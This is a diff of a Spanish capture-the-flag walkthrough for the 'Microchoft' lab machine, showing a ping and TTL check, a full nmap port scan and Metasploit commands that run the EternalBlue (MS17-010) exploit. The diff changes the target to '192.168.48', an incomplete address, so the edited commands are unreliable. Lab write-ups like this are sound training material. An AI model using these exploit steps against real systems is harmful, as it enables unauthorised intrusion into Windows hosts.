@@ -4,7 +4,7 @@
 A continuación, se describe la guía de resolución de la máquina de **The Hackers Labs** denominada *"Microchoft"*.
 
 Esta máquina está catalogada con la dificultad **"Principiante"** y sus autores son **condor** y **CuriosidadesDeHackers**.
-
+https://youtu.be/lSUQq255I-s?si=VA0BCk5vfyJVz1cI
 ---
 
 ## ⚠️ ATENCIÓN
@@ -18,7 +18,7 @@ Las herramientas y técnicas utilizadas en la resolución de este laboratorio ha
 Se inicia el reconocimiento mediante un `ping` a la máquina para detectar su accesibilidad y el sistema operativo mediante el **TTL** asignado.
 
 ```bash
-ping -c 1 192.168.150.133
+ping -c 1 192.168.48
 ```
 
 Se comprueba que el **TTL es 128**, lo que indica:
@@ -31,7 +31,7 @@ Se comprueba que el **TTL es 128**, lo que indica:
 
 ### 1. Escaneo de todos los puertos TCP (SYN)
 ```bash
-sudo nmap -sS -p- --min-rate 1000 -n -Pn 192.168.150.133 -oN allPorts
+sudo nmap -sS -p- --min-rate 1000 -n -Pn 192.168.48 -oN allPorts
 ```
 
 ### 2. Reconocimiento de servicios en puertos abiertos
@@ -78,7 +78,7 @@ Se configura y ejecuta el exploit **EternalBlue** para obtener una sesión **Met
 msfconsole
 msf> search eternalblue
 msf> use exploit/windows/smb/ms17_010_eternalblue
-msf> set RHOSTS 192.168.150.133
+msf> set RHOSTS 192.168.48
 msf> options
 msf> run
 ```
